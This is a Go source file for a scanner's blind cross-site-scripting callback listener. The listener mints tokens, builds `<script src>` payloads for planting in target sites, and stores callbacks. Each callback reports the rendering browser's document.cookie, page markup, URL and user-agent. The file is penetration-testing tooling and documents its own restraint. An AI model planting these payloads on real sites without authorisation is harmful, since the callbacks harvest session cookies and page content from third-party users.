// Package blindxss provides a callback channel for blind cross-site scripting: a
// payload planted in one place, rendered somewhere burpsy cannot observe, calling
// home with a correlation token.
//
// # What this is, and why it is a sibling of internal/oob rather than part of it
//
// A stored XSS payload is only confirmable when the scanner can read the page that
// renders it. The blind case — an admin panel, another user's session, a log viewer,
// an HTML email client — renders in a browser burpsy will never drive, so there is no
// response body to match a canary against. The only evidence available is a callback
// from that browser.
//
// That is the same evidence shape internal/oob confirms SSRF and blind SQLi with, so
// this package deliberately mirrors its API: mint a correlation token, plant something
// carrying it, poll for hits later. The two are siblings, not layers. They differ in
// what the callback proves and therefore in what infrastructure it needs:
//
//   - oob proves a *server* reached out. A DNS or bare HTTP hit from the target is
//     enough, so it can lean on a public Interactsh instance and carry no listener of
//     its own.
//   - blindxss proves a *browser rendered attacker-controlled markup as script*. That
//     needs a document to execute, which means serving JavaScript, which means owning
//     an HTTP listener. Interactsh's protocol has nowhere to put a JS payload or the
//     structured page context that comes back with it.
//
// So this package binds and owns a real net/http server. Nothing here replaces or
// wraps internal/oob; a check may reasonably use both.
//
// # The token scheme
//
// Tokens are `bsy` + 13 characters of [a-z0-9], the same shape the scanner's
// StoredLedger mints for its stored canaries (internal/scanner/infra_stored.go) and
// compatible with the lowercased alphanumeric correlation ids internal/oob correlates
// on. The vocabulary is copied rather than imported: internal/scanner depends on this
// package's direction of travel, not the reverse, and a leaf package that reached back
// into scanner would invert that. The shape is chosen so a blind-XSS token is
// recognisable as the same kind of thing as a stored canary to anyone reading a report,
// and so it survives being pasted through a URL path, an HTML attribute, or a hostname
// label without escaping.
//
// A token appears in exactly two places: the path of the script URL the payload loads,
// and the JSON body the script posts back. Both are checked, so a hit is only recorded
// against a token this listener actually minted.
//
// # The honest-failure contract
//
// If the listener cannot bind its configured address, NewListener returns a *BindError
// naming the address and the cause. A caller MUST surface that as "no blind-XSS channel
// available" and MUST NOT report a clean result. Zero hits on a listening channel and
// zero hits because nothing was ever listening are different facts, and conflating them
// turns an unplanted payload into an apparent absence of vulnerability. This is the same
// rule internal/oob follows for a missing interactsh-client and internal/domexec follows
// for a missing Chrome.
//
// The same contract has a second edge specific to this channel: a hit proves the payload
// executed, but *no* hit never proves it did not. The rendering browser may be offline
// for days, may never load the page, or may sit behind egress filtering that drops the
// callback. Outstanding is not clean — see the StoredLedger's Outstanding state for the
// vocabulary a caller should report this in.
//
// # Safety: this is a detection instrument, not a payload delivery platform
//
// The served JavaScript is fixed, is generated only from this package's own template,
// and does exactly one thing: read five page properties, POST them once, stop. It does
// not persist, does not schedule further work, does not install handlers, does not read
// or exfiltrate storage beyond document.cookie, does not touch the DOM, and never
// executes anything received from the network. The DOM capture is bounded by
// Options.MaxDOMBytes so a hit reports enough markup to prove where the payload landed
// without exfiltrating a victim's whole page.
//
// This restraint is deliberate and load-bearing. The payload runs in a third party's
// browser session — very often a real person who is not the engagement's subject — and
// the only thing that justifies it running at all is that it proves the vulnerability
// exists and then gets out. Anything beyond capture-and-report crosses from evidence
// into exploitation. Do not extend the template with keylogging, session riding,
// screenshotting, secondary requests, or persistence, however easy it would be.
package blindxss

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

const (
	tokenAlphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
	// tokenPrefix and tokenEntropyChars mirror the scanner's stored-canary shape. See the
	// package doc on why the vocabulary is copied rather than imported.
	tokenPrefix       = "bsy"
	tokenEntropyChars = 13

	// scriptPathPrefix and reportPathSuffix build the two token-carrying routes:
	// GET  /bxss/<token>.js
	// POST /bxss/<token>/report
	scriptPathPrefix = "/bxss/"
	scriptPathSuffix = ".js"
	reportPathSuffix = "/report"

	// defaultMaxDOMBytes bounds the markup snippet the payload sends back. Enough to show
	// the injection context (the surrounding element and its neighbours) and no more; see
	// the package doc on why this is capped rather than unbounded.
	defaultMaxDOMBytes = 8 * 1024

	// bodySlack is the headroom over MaxDOMBytes allowed for the rest of the JSON — the
	// cookies, URL, referrer, user-agent and field names. The request body is refused
	// above MaxDOMBytes+bodySlack so a hostile poster cannot grow the hit store with one
	// enormous body.
	bodySlack = 16 * 1024

	// maxHitsPerToken and maxTokens bound the in-memory store. A token whose payload
	// landed on a heavily-trafficked page can fire repeatedly; the first hits are the
	// evidence, and the thousandth adds nothing but memory.
	maxHitsPerToken = 64
	maxTokens       = 4096
)

// Hit is one callback: a browser somewhere rendered a planted payload and reported what
// it could see.
//
// Every field except ReceivedAt and RemoteAddress is self-reported by the victim's
// browser through our own script and is therefore attacker-influenceable in the general
// case — a page can lie about its own location or user-agent. Treat them as evidence of
// context, not as authenticated facts. RemoteAddress is the connecting IP as this
// listener's own socket saw it, which is the one field the reporting page cannot forge
// (though it may be a proxy or NAT rather than the victim's own host).
type Hit struct {
	// Token is the correlation token, matched against the minted set before storing.
	Token string `json:"token"`
	// Cookies is document.cookie as the rendering page saw it. Empty when the payload
	// executed in a context with no cookies or where they are all HttpOnly — an empty
	// string here is not evidence that no session exists.
	Cookies string `json:"cookies"`
	// DOM is a prefix of document.documentElement.outerHTML, truncated to
	// Options.MaxDOMBytes by the payload itself. Truncated reports whether that cap bit.
	DOM string `json:"dom"`
	// Truncated reports that the page's markup was longer than the cap, so DOM is a
	// prefix and the absence of a string in it proves nothing.
	Truncated bool `json:"truncated"`
	// Location is location.href of the rendering page: where the payload actually
	// executed, which is the fact a blind finding turns on.
	Location string `json:"location"`
	// Referrer is document.referrer of the rendering page.
	Referrer string `json:"referrer"`
	// UserAgent is navigator.userAgent as reported by the page's own script.
	UserAgent string `json:"userAgent"`

	// HeaderUserAgent is the User-Agent header on the callback request itself. It is
	// recorded separately from UserAgent because the two disagreeing is meaningful: a
	// replayed or forged callback can set either independently.
	HeaderUserAgent string `json:"headerUserAgent"`
	// RemoteAddress is the connecting client IP as observed by this listener.
	RemoteAddress string `json:"remoteAddress"`
	// ReceivedAt is this listener's clock when the callback arrived.
	ReceivedAt time.Time `json:"receivedAt"`
}

// Options configures a Listener. The zero value is usable: it binds an ephemeral port on
// loopback and caps the DOM snippet at 8 KiB.
type Options struct {
	// Addr is the listen address, in net.Listen form. Empty means "127.0.0.1:0" — an
	// ephemeral loopback port, which is right for tests and wrong for a real engagement,
	// where the rendering browser must be able to reach this host.
	Addr string

	// BaseURL is the externally reachable origin the planted payload should load from,
	// without a trailing slash (e.g. "http://collab.example.net:8080"). Empty means
	// "http://" + the bound address, which is only correct when the rendering browser
	// shares this host's view of that address. Set this whenever the listener sits behind
	// a port forward, a tunnel, or a reverse proxy: the payload has to name an address the
	// *victim's* browser can reach, not one this process can.
	BaseURL string

	// MaxDOMBytes caps the markup snippet a payload reports. Zero means 8 KiB.
	MaxDOMBytes int
}

// BindError is the typed failure a caller must not mistake for an empty result: the
// channel does not exist, so no verdict about hits is available at all.
type BindError struct {
	Addr string
	Err  error
}

func (e *BindError) Error() string {
	return fmt.Sprintf("no blind-XSS callback channel: cannot listen on %q: %v", e.Addr, e.Err)
}

func (e *BindError) Unwrap() error { return e.Err }

// Payload is one minted correlation token and the two forms of it a check plants.
type Payload struct {
	// Token is the correlation id to poll HitsFor with.
	Token string
	// ScriptURL is the bare URL of the served JavaScript, for injection contexts that
	// take a URL directly (a src attribute already under construction, an import, a
	// CSS url(), a redirect target).
	ScriptURL string
}

// ScriptTag is the payload for an HTML injection context: a script element that loads
// and runs the capture script when the page is rendered.
func (p Payload) ScriptTag() string {
	return `<script src="` + p.ScriptURL + `"></script>`
}

// Listener owns the bound socket, the HTTP server serving payloads and accepting
// callbacks, and the in-memory hit store.
//
// The store is in-memory and dies with the process, matching internal/oob, whose
// interaction log is a temp file removed on Close. Neither channel is a system of
// record: a hit that matters is promoted to a finding, and the finding is what persists
// (internal/persist). Adding a persistence tier here would make this the only capability
// package that outlives its scan, which is a decision for whoever needs it and not one
// to take by default.
type Listener struct {
	ln      net.Listener
	srv     *http.Server
	baseURL string
	maxDOM  int

	mu     sync.Mutex
	tokens map[string]struct{}
	hits   map[string][]Hit

	closeOnce sync.Once
	closeErr  error
}

// NewListener binds the configured address and starts serving.
//
// A bind failure is returned as a *BindError naming the address, never as a listener
// that yields no hits — see the package doc on the honest-failure contract. ctx bounds
// only the bind itself; the returned Listener outlives it and is released with Close,
// because the whole point of this channel is to still be listening long after the check
// that planted a payload has returned.
func NewListener(ctx context.Context, opts Options) (*Listener, error) {
	addr := opts.Addr
	if addr == "" {
		addr = "127.0.0.1:0"
	}
	maxDOM := opts.MaxDOMBytes
	if maxDOM <= 0 {
		maxDOM = defaultMaxDOMBytes
	}

	var lc net.ListenConfig
	ln, err := lc.Listen(ctx, "tcp", addr)
	if err != nil {
		return nil, &BindError{Addr: addr, Err: err}
	}

	baseURL := strings.TrimRight(opts.BaseURL, "/")
	if baseURL == "" {
		baseURL = "http://" + ln.Addr().String()
	}

	l := &Listener{
		ln:      ln,
		baseURL: baseURL,
		maxDOM:  maxDOM,
		tokens:  make(map[string]struct{}),
		hits:    make(map[string][]Hit),
	}

	mux := http.NewServeMux()
	mux.HandleFunc(scriptPathPrefix, l.route)
	l.srv = &http.Server{
		Handler: mux,
		// A victim's browser is on an unknown network and the callback body is capped
		// anyway; these bound a stalled or hostile connection rather than a slow one.
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	go func() {
		// Serve returns ErrServerClosed on Close, which is the expected outcome and not a
		// failure to report.
		_ = l.srv.Serve(ln)
	}()

	return l, nil
}

// BaseURL is the origin planted payloads load from.
func (l *Listener) BaseURL() string { return l.baseURL }

// Addr is the address actually bound, which is what a caller needs when Options.Addr
// asked for an ephemeral port.
func (l *Listener) Addr() net.Addr { return l.ln.Addr() }

// GeneratePayload mints a correlation token and returns the payload forms carrying it.
//
// Two checks polling the same listener cannot read each other's callbacks, because a hit
// is only ever stored against the single token in its own URL — this is the role
// internal/oob gives its per-probe marker, taken here by the token itself since the
// listener is ours and can enforce it rather than filtering after the fact.
func (l *Listener) GeneratePayload() (Payload, error) {
	token, err := mintToken()
	if err != nil {
		return Payload{}, err
	}

	l.mu.Lock()
	if len(l.tokens) >= maxTokens {
		l.mu.Unlock()
		return Payload{}, fmt.Errorf("blindxss: refusing to mint a token: the listener already holds %d, which is the cap", maxTokens)
	}
	l.tokens[token] = struct{}{}
	l.mu.Unlock()

	return Payload{
		Token:     token,
		ScriptURL: l.baseURL + scriptPathPrefix + token + scriptPathSuffix,
	}, nil
}

// HitsFor returns the callbacks recorded for token, oldest first, or nil for a token
// this listener never minted or that has not fired.
//
// The nil return is the reason the honest-failure contract exists: it is
// indistinguishable between "planted and never rendered" and "never planted", and only
// the caller knows which. It carries an error for symmetry with
// oob.Client.InteractionsFor and to leave room for a future store that can fail; the
// in-memory store cannot, so today it is always nil.
func (l *Listener) HitsFor(token string) ([]Hit, error) {
	if token == "" {
		return nil, errors.New("blindxss: HitsFor needs a token; an empty one would return another check's callbacks")
	}
	l.mu.Lock()
	defer l.mu.Unlock()
	stored := l.hits[token]
	if len(stored) == 0 {
		return nil, nil
	}
	out := make([]Hit, len(stored))
	copy(out, stored)
	return out, nil
}

// Close stops serving and releases the socket. It is safe to call more than once. Stored
// hits are dropped with it.
func (l *Listener) Close() error {
	l.closeOnce.Do(func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := l.srv.Shutdown(shutdownCtx); err != nil {
			l.closeErr = fmt.Errorf("blindxss: shutting down the callback listener: %w", err)
			// Shutdown waiting out its deadline leaves the socket held, so fall back to the
			// abrupt close rather than leaking the port.
			_ = l.srv.Close()
		}
	})
	return l.closeErr
}

// route dispatches the two token-carrying paths. It is one handler rather than two
// registered patterns because both live under the same prefix and the token sits in the
// middle of each, which ServeMux's own patterns cannot express.
func (l *Listener) route(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, scriptPathPrefix)

	switch {
	case strings.HasSuffix(rest, scriptPathSuffix):
		l.serveScript(w, r, strings.TrimSuffix(rest, scriptPathSuffix))
	case strings.HasSuffix(rest, reportPathSuffix):
		l.serveReport(w, r, strings.TrimSuffix(rest, reportPathSuffix))
	default:
		http.NotFound(w, r)
	}
}

// serveScript renders the capture script for a minted token.
//
// An unminted or malformed token is a 404, not a generic script: serving the template to
// any token that happens to be requested would let a passer-by generate hits the scanner
// never planted, and a finding built on one of those would be fabricated evidence.
func (l *Listener) serveScript(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		w.Header().Set("Allow", "GET, HEAD")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !l.known(token) {
		http.NotFound(w, r)
		return
	}

	js := renderScript(token, l.baseURL+scriptPathPrefix+token+reportPathSuffix, l.maxDOM)

	w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	// The rendering page is on an unknown origin, and a cached copy would make a repeat
	// render invisible to us.
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusOK)
	if r.Method == http.MethodHead {
		return
	}
	_, _ = w.Write([]byte(js))
}

// serveReport records one callback.
//
// The token is taken from the URL path and cross-checked against the token in the body:
// a body claiming a different token than the URL it was posted to is refused rather than
// filed under either, because one of the two is wrong and there is no way to tell which.
func (l *Listener) serveReport(w http.ResponseWriter, r *http.Request, token string) {
	if r.Method != http.MethodPost {
		w.Header().Set("Allow", "POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// The payload posts text/plain to stay a CORS "simple request", so the browser sends
	// it without a preflight the victim's page might refuse. Answering the preflight
	// anyway costs nothing and keeps a stricter future payload working.
	w.Header().Set("Access-Control-Allow-Origin", "*")
	if !l.known(token) {
		http.NotFound(w, r)
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, int64(l.maxDOM+bodySlack))
	var reported struct {
		Token     string `json:"token"`
		Cookies   string `json:"cookies"`
		DOM       string `json:"dom"`
		Truncated bool   `json:"truncated"`
		Location  string `json:"location"`
		Referrer  string `json:"referrer"`
		UserAgent string `json:"userAgent"`
	}
	if err := json.NewDecoder(r.Body).Decode(&reported); err != nil {
		http.Error(w, "bad report", http.StatusBadRequest)
		return
	}
	if reported.Token != token {
		http.Error(w, "token mismatch", http.StatusBadRequest)
		return
	}

	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		host = r.RemoteAddr
	}

	hit := Hit{
		Token:           token,
		Cookies:         reported.Cookies,
		DOM:             reported.DOM,
		Truncated:       reported.Truncated,
		Location:        reported.Location,
		Referrer:        reported.Referrer,
		UserAgent:       reported.UserAgent,
		HeaderUserAgent: r.Header.Get("User-Agent"),
		RemoteAddress:   host,
		ReceivedAt:      time.Now().UTC(),
	}

	l.mu.Lock()
	if len(l.hits[token]) < maxHitsPerToken {
		l.hits[token] = append(l.hits[token], hit)
	}
	l.mu.Unlock()

	w.WriteHeader(http.StatusNoContent)
}

// known reports whether this listener minted token.
func (l *Listener) known(token string) bool {
	l.mu.Lock()
	defer l.mu.Unlock()
	_, ok := l.tokens[token]
	return ok
}

// mintToken produces `bsy` + 13 characters of [a-z0-9] from crypto/rand.
//
// The modulo bias across a 36-character alphabet over a byte is real but irrelevant
// here: the token is a correlation id, not a secret protecting anything, and 13
// characters leave ~67 bits even at the biased distribution.
func mintToken() (string, error) {
	buf := make([]byte, tokenEntropyChars)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("blindxss: cannot mint a correlation token: %w", err)
	}
	var sb strings.Builder
	sb.Grow(len(tokenPrefix) + tokenEntropyChars)
	sb.WriteString(tokenPrefix)
	for _, b := range buf {
		sb.WriteByte(tokenAlphabet[int(b)%len(tokenAlphabet)])
	}
	return sb.String(), nil
}
